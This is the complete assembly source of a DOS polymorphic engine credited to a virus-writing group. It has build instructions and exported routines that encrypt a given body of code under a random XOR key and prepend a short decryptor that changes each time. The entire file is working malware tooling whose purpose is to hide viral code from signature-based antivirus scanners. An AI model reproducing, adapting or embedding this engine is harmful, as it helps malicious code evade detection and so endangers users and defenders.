; comment *
;                  Mini Polymorphic Engine [MPE] v 0.01
;                             assembly by
;                       KimInWoo/SmartLine/40Hex
; 
;                  Calling parameters:
;                    CX     Length of plain code
;                    BP     Decryptors offset
;                    DS:SI  Pointer to plain code
;                    ES:DI  Pointer to decryptor + encrypted code
; 
;                  Return parameters:
;                    CX     Length of decryptor + encrypted code
; 
; Mini Polymorphic Engine decryptor:
;   MOV BX,imm16; MOV DI,imm16; MOV SI,imm16
;   MOV CX,imm16
;   XOR [BX],imm8; XOR [DI],imm8; XOR [SI],imm8
;   CMP BX,imm16; CMP DI,imm16; CMP SI,imm16
;   JE imm8
;   INC BX; INC DI; INC SI
;   JMP imm16
; 
;  decryptor size:            16 bytes.
; 
; Compile Mini Polymorphic Engine with Turbo Assembler v 4.0 by typing:
;   TASM /M2 MPE.ASM
; 
; *

public       mpe,mpeend,rndget

.model tiny
.code

code_begin:
mpe          proc    near
             push    di

             mov     cs:[plain_off],si
             mov     cs:[plain_seg],ds

             push    cs
             pop     ds

             mov     [plain_length],cx

             mov     ah,02h
             call    rndget
             mov     [random_reg16],al

             mov     al,0b8h
             mov     bl,[random_reg16]
             xor     bh,bh
             or      al,[bx+reg16ortable]
             stosb
             mov     [movreg16_off],di
             add     di,02h

gen_decrypt:
             xor     bx,bx
             mov     ax,[bx+decrypttable]

             mov     bl,[random_reg16]
             or      al,[bx+decryptortab]
             xchg    al,ah
             stosw


             call    rndplainget
             mov     [decrypt_key],al
             stosb

             mov     al,81h
             stosb

             mov     al,0f8h
             or      al,[bx+reg16ortable]
             stosb
             mov     [cmpreg16_off],di
             add     di,02h

             mov     al,74h
             stosb
             mov     [je_imm8_off],di
             inc     di
gen_inc_r16:
             mov     al,40h
             or      al,[bx+reg16ortable]
             stosb
gen_jmp_i16:
             mov     al,0e9h
             stosb

             mov     ax,[movreg16_off]
             sub     ax,di
             stosw
gen_immediat:
             pop     ax
             push    ax
             push    di
             sub     di,ax
             mov     bx,[movreg16_off]
             mov     ax,di
             add     ax,bp
             mov     es:[bx],ax


             mov     ax,di               
             add     ax,[plain_length]   
             add     ax,bp               
             mov     bx,[cmpreg16_off]   
             mov     es:[bx],ax          

             pop     di

             mov     bx,[je_imm8_off]    
             push    di                  
             sub     di,bx               
             dec     di                  
             xchg    di,bx               
             mov     al,bl               
             stosb                       
             pop     di                  
encrypt_ret:
             mov     al,[decrypt_key]
             mov     [encrypt_key],al
             call    gen_encrypt
             pop     ax
             push    ax
             sub     di,ax
             mov     cx,di               
             pop     di

             ret                         
             endp

gen_encrypt  proc    near                

encryptor:
             mov     cx,[plain_length]
             mov     si,word ptr [plain_off]
encrypt:
             lodsb

encrypt_algo db      34h
encrypt_key  db      ?
             stosb                       

             loop    encrypt

             ret                         
             endp

rndget       proc    near                
             call    rndplainget

             cmp     al,ah               
             ja      rndget              

             ret                         
             endp

rndplainget  proc    near                
             in      al,40h              

             nop
             ror     al,01h              
             db      04h                 
random       db      ?                   

             mov     [random],al         

             ret                         
             endp

decrypttable dw      8030h               
decryptortab db      00000100b           
             db      00000101b           
             db      00000111b           
reg16ortable db      00000110b           
             db      00000111b           
             db      00000011b           
random_reg16 db      ?                   
movreg16_off dw      ?                   
cmpreg16_off dw      ?                   
je_imm8_off  dw      ?                   
decrypt_key  db      ?                   
plain_length dw      ?                   
plain_off    dw      ?                   
plain_seg    dw      ?                   

mpeend       equ     $                   
code_end:

end          code_begin
